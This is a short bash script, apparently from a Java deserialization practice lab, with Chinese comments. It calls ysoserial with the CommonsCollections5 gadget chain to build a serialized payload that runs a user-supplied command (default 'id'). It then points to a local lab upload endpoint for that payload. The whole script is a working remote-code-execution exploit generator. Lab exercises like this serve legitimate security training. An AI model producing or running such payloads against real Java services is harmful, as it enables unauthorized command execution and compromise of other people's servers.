#!/bin/bash
# class18 — CC5链 (CommonsCollections5)
# 靶场: /class18/upload — 做了类型校验，只接受 BadAttributeValueExpException
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.management/javax.management=ALL-UNNAMED
  --add-exports java.base/sun.reflect.annotation=ALL-UNNAMED
  --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
  --add-exports java.base/java.util=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections5 "$CMD" > ../../class18.ser 2>&1
echo "✅ 已生成: class18.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class18/"
